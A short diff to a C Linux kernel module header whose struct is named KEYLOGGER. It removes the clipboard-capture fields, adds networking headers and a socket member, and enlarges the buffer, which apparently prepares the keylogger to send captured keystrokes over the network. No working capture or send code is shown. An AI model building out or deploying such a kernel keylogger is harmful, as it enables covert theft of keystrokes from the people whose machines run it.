@@ -9,15 +9,14 @@
 #include <linux/fs.h>
 #include <linux/workqueue.h>
 #include <linux/fs.h>
-#include "struct_clipboard.h"
-
+#include <linux/in.h>
+#include <linux/net.h>
 #define TMP_BUFF_SIZE 16
-#define BUFF_SIZE 256
+#define BUFF_SIZE 1024
 
     typedef struct KEYLOGGER
     {
-        CLIPBOARD clipboard;
-        struct work_struct work_clipboard;
+        struct socket * socket;
         struct file* filename;//avem nevoie de aceasta structura pt ca filp_open intoarce acest tip de date(un fel de FILE* sau fd)
         struct notifier_block key_notifier;
         struct work_struct work_struct;
